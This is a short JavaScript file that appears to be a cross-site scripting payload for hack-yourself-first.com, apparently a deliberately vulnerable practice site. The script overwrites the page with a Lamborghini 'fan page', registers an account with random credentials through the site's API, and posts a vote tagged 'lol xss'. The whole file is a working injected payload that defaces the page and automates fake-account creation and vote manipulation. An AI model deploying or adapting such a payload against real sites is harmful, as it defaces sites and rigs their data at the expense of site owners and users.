document.open();
document.write(`
    <h1>lamborghini FAN PAGE!!!!</h1>
    <iframe width="560" height="315" src="https://www.youtube.com/embed/708mjaHTwKc" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
    <img src="https://www.topgear.com/sites/default/files/styles/16x9_1280w/public/images/news-article/2018/01/38eba6282581b285055465bd651a2a32/2bc8e460427441.5a4cdc300deb9.jpg?itok=emRGRkaa" />
`);
document.close();

// https://stackoverflow.com/questions/1349404/generate-random-string-characters-in-javascript
function makeid(length) {
  var text = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

  for (var i = 0; i < length; i++)
    text += possible.charAt(Math.floor(Math.random() * possible.length));

  return text;
}

function vote() {
    $.post("http://hack-yourself-first.com/api/vote", {
        "userId": 1,
        "supercarId": 1,
        "comments": "lol xss"
    })
}

var pwd = makeid(20);
$.post("http://hack-yourself-first.com/Account/Register", {
    "Email": makeid(10) + "@gmail.com",
    "FirstName": makeid(6),
    "LastName": makeid(6),
    "Password": pwd,
    "ConfirmPassword": pwd
}, () => { vote(); });
